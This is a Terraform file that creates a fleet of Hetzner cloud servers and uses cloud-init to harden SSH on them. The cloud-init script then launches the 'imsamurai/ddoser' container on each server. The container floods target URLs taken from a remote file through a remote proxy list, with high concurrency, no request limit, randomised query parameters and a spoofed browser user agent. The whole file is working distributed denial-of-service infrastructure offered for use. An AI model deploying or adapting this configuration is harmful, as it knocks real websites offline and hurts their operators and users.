locals {
  # t = yamldecode(file("config.yml"))
  # # target array
  # t_array = flatten([for i in local.t.targets : [for j in range(tonumber(i.count)) : i.host]])

  # location array 
  l_array = [
    for i in range(var.kozak_count) :
    try(
      var.locations[i],
      var.locations[i - length(var.locations) * floor(i / length(var.locations))]
    )
  ]
}

resource "tls_private_key" "ssh_key" {
  algorithm = "RSA"
  rsa_bits  = 4096
}

resource "local_file" "kozak" {
  content         = tls_private_key.ssh_key.private_key_pem
  filename        = "${abspath(path.root)}/kozak"
  file_permission = "0400"
}

resource "hcloud_ssh_key" "cloud_ssh_key" {
  name       = "da_key"
  public_key = tls_private_key.ssh_key.public_key_openssh
}

resource "hcloud_server" "kozak" {
  count       = var.kozak_count
  name        = "kozak-${count.index}"
  image       = var.os_type
  server_type = var.server_type
  location    = local.l_array[count.index]
  ssh_keys    = [hcloud_ssh_key.cloud_ssh_key.id]
  user_data   = <<EOF
#cloud-config
users:
  - name: kozak
    groups: users, admin, docker
    sudo: ALL=(ALL) NOPASSWD:ALL
    shell: /bin/bash
    ssh_authorized_keys:
      - ${tls_private_key.ssh_key.public_key_openssh}
package_update: true
package_upgrade: true
packages:
  - docker.io 
runcmd:
  - sed -ie '/^PermitRootLogin/s/^.*$/PermitRootLogin no/' /etc/ssh/sshd_config
  - sed -ie '/^PasswordAuthentication/s/^.*$/PasswordAuthentication no/' /etc/ssh/sshd_config
  - sed -ie '/^X11Forwarding/s/^.*$/X11Forwarding no/' /etc/ssh/sshd_config
  - sed -ie '/^#MaxAuthTries/s/^.*$/MaxAuthTries 2/' /etc/ssh/sshd_config
  - sed -ie '/^#AllowTcpForwarding/s/^.*$/AllowTcpForwarding no/' /etc/ssh/sshd_config
  - sed -ie '/^#AllowAgentForwarding/s/^.*$/AllowAgentForwarding no/' /etc/ssh/sshd_config
  - sed -ie '/^#AuthorizedKeysFile/s/^.*$/AuthorizedKeysFile .ssh/authorized_keys/' /etc/ssh/sshd_config
  - sed -i '$a AllowUsers kozak' /etc/ssh/sshd_config
  - systemctl restart ssh
  - systemctl unmask docker.service
  - systemctl unmask docker.socket
  - systemctl start docker.service
  - systemctl start docker
  - docker run -d --ulimit nofile=100000:100000 imsamurai/ddoser --target-urls-file "${var.targets_file_url}" --concurrency 300 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}"
EOF
}